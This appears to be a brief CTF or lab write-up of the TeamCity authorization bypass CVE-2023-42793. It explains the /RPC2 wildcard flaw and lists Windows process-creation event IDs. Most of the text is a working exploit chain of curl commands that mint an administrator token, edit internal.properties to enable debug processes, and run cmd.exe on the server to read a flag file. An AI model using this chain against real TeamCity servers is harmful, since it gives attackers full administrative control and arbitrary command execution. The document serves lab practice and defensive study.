# JetBrains TeamCity CVE-2023-42793

**Understandng the Vulnerability**

Request Intercepteors in Java

Tasks: logging,authentication, authorization, modifying requests or respond. These interceptors ensure consistent handling and security across application endpoints.

TeamCity uses request interceptors to handle actions on every HTTP request, including authorization checks. 

Authorization Bypass: The vulnerability arises because requests to paths ending in /RPC2 bypass authorization checks due to wildcard matching `/**/RPC2'

Attacker can this flaw to obtain authentication tokens and gain Administrator-level access to server

**Windows Log Analysis**
Event ID 4688 (A new process has been create) or Event ID 1 (sysmon: process creation)

**Reproduce**
Step 1: Create an Authentication Token
```bash
curl -X POST http://10.129.232.10/app/rest/users/id:1/tokens/RPC2
```
This request return token
eyJ0eXAiOiAiVENWMiJ9.YUEwNmQ5OWN3dWtoT1Y2cFVJMkFXN3BoUzlv.NDMzOTVhMWEtNDM4OC00MTY1LTkxNjItODUzODc3N2Y3MDNj
Step 2: Enable Debug mode for RCE
- With the Administrator token in hand, we needed to enable debug mode on TeamCity server. This mode allows us for exectution of arbitrary shell commands
```bash
curl -H "Authorization: Bearer <Your_Token>" -X POST "http://10.129.232.10/admin/dataDir.html?action=edit&fileName=config%2Finternal.properties&content=rest.debug.processes.enable=true"
```
Refresh Server for Debug mode
```bash
curl -H "Authorization: Bearer <Token>" "http://10.129.232.10/admin/admin.html?item=diagnostics&tab=dataDir&file=config/internal.properties"
```
Step 3: Execute Arbitrary Command(RCE)
```bash
curl -H "Authorization: Bearer <Your_Token>" -X POST "http://10.129.232.10/app/rest/debug/processes?exePath=cmd.exe&params=/c%20type%20C%3A%5CUsers%5CAdministrator%5CDesktop%5Croot.txt"
```
Retrieve the root.txt file
